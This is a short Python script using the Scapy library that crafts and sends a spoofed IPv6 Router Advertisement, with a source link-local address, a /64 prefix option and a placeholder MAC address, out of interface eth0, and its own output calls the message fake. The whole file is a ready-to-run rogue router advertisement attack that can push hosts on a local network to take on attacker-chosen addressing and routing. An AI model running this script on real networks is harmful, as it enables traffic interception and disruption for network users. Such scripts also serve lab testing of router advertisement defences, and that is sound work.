#!/usr/bin/python

from scapy.all import *

mac_addr = "[YOUR_MAC_ADDR]"
src_addr = "fe80::42:fcff:dead:beef"
prefix = "2001:db8:1::"

ra  = Ether(src=mac_addr)/IPv6(src=src_addr)/ICMPv6ND_RA()
ra /= ICMPv6NDOptPrefixInfo(prefix=prefix, prefixlen=64)
ra /= ICMPv6NDOptSrcLLAddr(lladdr=mac_addr)

print("Sending a fake router advertisement message...")
sendp(ra, iface="eth0")
